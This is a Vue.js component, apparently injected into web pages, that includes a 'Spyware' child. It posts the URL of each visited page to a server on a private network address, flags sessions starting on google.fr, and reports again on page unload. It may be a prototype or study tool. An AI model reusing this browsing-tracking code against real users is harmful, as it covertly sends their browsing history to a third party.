<template>
  <div class="injector">
    <popup @toggleGlow="assistantGlow = !assistantGlow" :index="index" />
    <spyware :index="index" />
    <assistant :index="index" :glow="assistantGlow" />
    <message-popup v-if="popupData" :title="popupData.title" :message="popupData.message" :url="popupData.url" />
  </div>
</template>

<script>
import axios from 'axios';
import Popup from './Popup';
import Spyware from './Spyware';
import Assistant from './Assistant';
import MessagePopup from './MessagePopup';


export default {
  data(){
    return{
      interval: undefined,
      time: 0,
      assistantGlow: false,
      pageCleanup: false,
      index: undefined,
      popupData: undefined
    }
  },
  components: {
    Popup,
    Spyware,
    Assistant,
    MessagePopup
  },
  mounted(){
    this.interval = setInterval(this.incrementTime, 1000);
    window.addEventListener("beforeunload", this.destroy);
    if(window.location.href == "https://www.google.fr/"){
      console.log("Send session start");
      axios.get("https://192.168.137.222:8443/session/start");
    }

    axios.post("https://192.168.137.222:8443/parcours/open", {
      url: window.location.href
    }).then((index)=>{
      this.index = index;
    });
  },
  methods: {
    incrementTime(){
      this.time++;
    },
    destroy(event){
      if(!this.pageCleanup){
        axios.get("https://192.168.137.222:8443/test", {
          url: window.location.href 
        }).then(()=>{
          this.pageCleanup = true;
        });
      }
      console.error("Envoyer la requete au serveur");
    },
    injectPopup(data){
      this.popupData = data;
    }
  }
};
</script>
